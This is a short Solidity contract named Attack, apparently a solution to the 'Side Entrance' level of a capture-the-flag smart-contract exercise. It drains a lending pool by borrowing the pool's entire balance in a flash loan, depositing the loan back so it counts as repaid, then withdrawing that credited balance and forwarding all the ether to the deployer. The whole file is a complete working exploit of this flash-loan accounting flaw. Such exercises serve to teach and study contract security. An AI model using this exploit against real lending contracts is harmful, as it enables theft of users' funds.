// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import { SideEntranceLenderPool, IFlashLoanEtherReceiver } from "src/04-SideEntrance/SideEntranceLenderPool.sol";

contract Attack is IFlashLoanEtherReceiver {
    address internal _owner;
    SideEntranceLenderPool internal _pool;

    constructor(SideEntranceLenderPool pool) {
        _owner = msg.sender;
        _pool = pool;
    }

    function attack() external {
        _pool.flashLoan(address(_pool).balance);
        _pool.withdraw();
        (bool success,) = _owner.call{ value: address(this).balance }("");
        require(success, "attack failed");
    }

    function execute() external payable {
        _pool.deposit{ value: msg.value }();
    }

    receive() external payable { }
}
